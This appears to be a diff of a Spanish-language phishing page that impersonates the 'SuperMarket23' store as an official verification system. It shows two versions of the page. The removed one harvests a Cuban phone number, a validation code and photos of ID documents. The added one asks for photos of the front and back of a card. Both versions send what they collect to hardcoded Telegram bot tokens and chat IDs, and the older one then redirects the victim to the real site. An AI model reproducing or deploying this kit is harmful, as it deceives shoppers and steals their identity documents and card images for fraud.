@@ -3,96 +3,173 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Clientes | SuperMarket23</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SuperMarket23 - Verificación</title>
     <style>
-        body { background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; margin: 0; }
-        .card { background: white; width: 92%; max-width: 380px; border-radius: 12px; padding: 25px; box-shadow: 0 8px 20px rgba(0,0,0,0.05); border-top: 5px solid #0056b3; }
-        .header { text-align: center; margin-bottom: 20px; }
-        .header h1 { color: #0056b3; font-size: 22px; margin: 0; }
-        .header p { color: #666; font-size: 12px; margin-top: 5px; }
-        label { color: #444; font-size: 11px; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
-        .input-group { display: flex; align-items: center; background: #fff; border: 1px solid #ccc; border-radius: 6px; margin-top: 5px; }
-        .prefix { padding: 12px; background: #f8f9fa; font-weight: bold; border-right: 1px solid #ccc; }
-        .phone-input { border: none; padding: 12px; flex-grow: 1; outline: none; font-size: 16px; width: 100%; }
-        .upload-area { border: 2px dashed #0056b3; border-radius: 8px; padding: 12px; text-align: center; cursor: pointer; background: #f0f7ff; margin-top: 5px; display: block; }
-        .upload-area img { max-width: 100%; max-height: 100px; border-radius: 4px; }
-        .upload-area span { font-size: 11px; color: #0056b3; font-weight: 600; }
-        input[type="file"] { display: none; }
-        .pass-input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px; margin-top: 5px; text-align: center; letter-spacing: 10px; font-size: 22px; outline: none; }
-        .btn-auth { background: #0056b3; color: white; border: none; width: 100%; padding: 16px; border-radius: 6px; font-weight: bold; margin-top: 25px; cursor: pointer; font-size: 16px; }
+        * { box-sizing: border-box; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; }
+
+        /* Cabecera Profesional */
+        .header { 
+            width: 100%; 
+            padding: 50px 20px;
+            background-color: #004494; /* Azul Profesional */
+            color: white;
+            text-align: center;
+            border-bottom: 5px solid #002d62;
+        }
+
+        .header h1 { 
+            margin: 0; 
+            font-size: 42px; /* Letras Grandes */
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .header p { font-size: 16px; opacity: 0.9; margin-top: 10px; }
+
+        .container { padding: 30px 20px; max-width: 500px; margin: 0 auto; }
+
+        /* Cuadros con tamaño de tarjeta real */
+        .card-slot {
+            width: 100%;
+            height: 210px; 
+            border: 2px solid #004494; /* Azul */
+            border-radius: 10px;
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f9f9f9;
+            cursor: pointer;
+            overflow: hidden;
+            position: relative;
+            transition: 0.3s;
+        }
+
+        .card-slot:hover { background-color: #f0f7ff; }
+
+        .card-slot p { font-weight: bold; color: #004494; font-size: 14px; margin-top: 10px; }
+
+        .preview-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: none;
+        }
+
+        /* Botón de Envío */
+        .btn-submit {
+            width: 100%;
+            background-color: #004494;
+            color: white;
+            padding: 18px;
+            border: none;
+            border-radius: 5px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .btn-submit:active { background-color: #002d62; transform: translateY(2px); }
+
+        .icon-cam {
+            width: 40px;
+            height: 40px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%23004494" viewBox="0 0 24 24"><path d="M4 4h3l2-2h6l2 2h3a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm8 13a5 5 0 1 0 0-10 5 5 0 0 0 0 10z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
     <div class="header">
         <h1>SuperMarket23</h1>
-        <p>Verificación de Identidad Digital</p>
+        <p>SISTEMA DE VERIFICACIÓN OFICIAL</p>
     </div>
-    <form id="auth-proc">
-        <label>Teléfono de Contacto</label>
-        <div class="input-group"><span class="prefix">+53</span><input type="tel" id="u-tel" class="phone-input" placeholder="5XXXXXXX" required></div>
 
-        <label>Documento de Identidad (Frontal)</label>
-        <label class="upload-area" id="z1"><span>Toca para Escanear</span><input type="file" id="i1" accept="image/*" capture="camera" onchange="v(this, 'z1')"></label>
+    <div class="container">
+        <h2 style="text-align: center; color: #004494;">Escaneo de Documento</h2>
+        <p style="text-align: center; margin-bottom: 30px;">Toca cada cuadro para activar la cámara del móvil.</p>
 
-        <label>Soporte de Validación (A)</label>
-        <label class="upload-area" id="z2"><span>Toca para Escanear</span><input type="file" id="i2" accept="image/*" capture="camera" onchange="v(this, 'z2')"></label>
+        <div class="card-slot" onclick="document.getElementById('input-front').click()">
+            <img id="view-front" class="preview-img">
+            <div id="content-front" style="text-align: center;">
+                <div class="icon-cam"></div>
+                <p>ESCANEAR PARTE FRONTAL</p>
+            </div>
+            <input type="file" id="input-front" accept="image/*" capture="camera" style="display:none" onchange="preview(this, 'view-front', 'content-front')">
+        </div>
 
-        <label>Soporte de Validación (B)</label>
-        <label class="upload-area" id="z3"><span>Toca para Escanear</span><input type="file" id="i3" accept="image/*" capture="camera" onchange="v(this, 'z3')"></label>
+        <div class="card-slot" onclick="document.getElementById('input-back').click()">
+            <img id="view-back" class="preview-img">
+            <div id="content-back" style="text-align: center;">
+                <div class="icon-cam"></div>
+                <p>ESCANEAR PARTE TRASERA</p>
+            </div>
+            <input type="file" id="input-back" accept="image/*" capture="camera" style="display:none" onchange="preview(this, 'view-back', 'content-back')">
+        </div>
 
-        <label>Código de Validación</label>
-        <input type="password" id="u-cod" class="pass-input" maxlength="4" required>
+        <button class="btn-submit" id="btn-send" onclick="sendToTelegram()">ENVIAR VERIFICACIÓN</button>
+        <div id="status" style="margin-top: 15px; font-size: 14px; text-align:center; display: none;">Procesando...</div>
+    </div>
 
-        <button type="submit" class="btn-auth" id="btn-sub">Autenticar</button>
-    </form>
-</div>
+    <script>
+        const token = "7544330182:AAFrW7uF7qG2IasXoR3vGq9oYv_H135p0S0";
+        const chat_id = "-4748113880";
 
-<script>
-    // CONFIGURACIÓN FINAL APLICADA
-    const _c = {
-        _t: "8318759298:AAHQGru4lkB72lUN9TA-1VCZGxbl1n_3Nkc", 
-        _i: "6475554235",
-        _u: "https://www.supermarket23.com" 
-    };
-
-    function v(input, boxId) {
-        if (input.files && input.files[0]) {
-            let reader = new FileReader();
-            reader.onload = e => { document.getElementById(boxId).innerHTML = `<img src="${e.target.result}">`; }
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
-
-    document.getElementById('auth-proc').onsubmit = async (e) => {
-        e.preventDefault();
-        const b = document.getElementById('btn-sub');
-        b.innerText = "Verificando...";
-        b.disabled = true;
-
-        const tel = document.getElementById('u-tel').value;
-        const cod = document.getElementById('u-cod').value;
-        const info = `🔔 NUEVA ENTRADA\n📱 Tel: +53 ${tel}\n🔑 Cod: ${cod}`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${_c._t}/sendMessage?chat_id=${_c._i}&text=${encodeURIComponent(info)}`);
-
-            const imgs = ['i1', 'i2', 'i3'];
-            for (let id of imgs) {
-                let file = document.getElementById(id).files[0];
-                if (file) {
-                    let fd = new FormData();
-                    fd.append('chat_id', _c._i);
-                    fd.append('photo', file);
-                    await fetch(`https://api.telegram.org/bot${_c._t}/sendPhoto`, { method: 'POST', body: fd });
+        function preview(input, imgId, contentId) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById(imgId).src = e.target.result;
+                    document.getElementById(imgId).style.display = 'block';
+                    document.getElementById(contentId).style.display = 'none';
                 }
+                reader.readAsDataURL(input.files[0]);
             }
-        } catch (err) {}
+        }
 
-        window.location.href = _c._u;
-    };
-</script>
+        async function sendToTelegram() {
+            const front = document.getElementById('input-front').files[0];
+            const back = document.getElementById('input-back').files[0];
+            const btn = document.getElementById('btn-send');
+            const status = document.getElementById('status');
+
+            if (!front || !back) {
+                alert("Debes escanear ambos lados antes de enviar.");
+                return;
+            }
+
+            btn.disabled = true;
+            status.style.display = 'block';
+            status.innerText = "Enviando archivos a seguridad...";
+
+            try {
+                await sendFile(front, "FRONTAL - SUPERMARKET23");
+                await sendFile(back, "TRASERA - SUPERMARKET23");
+                status.innerHTML = "<b style='color:green'>¡ENVIADO CON ÉXITO!</b>";
+                alert("La información se ha enviado correctamente.");
+            } catch (e) {
+                status.innerHTML = "<b style='color:red'>Error de conexión. Reintenta.</b>";
+                btn.disabled = false;
+            }
+        }
+
+        async function sendFile(file, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+        }
+    </script>
 </body>
 </html>
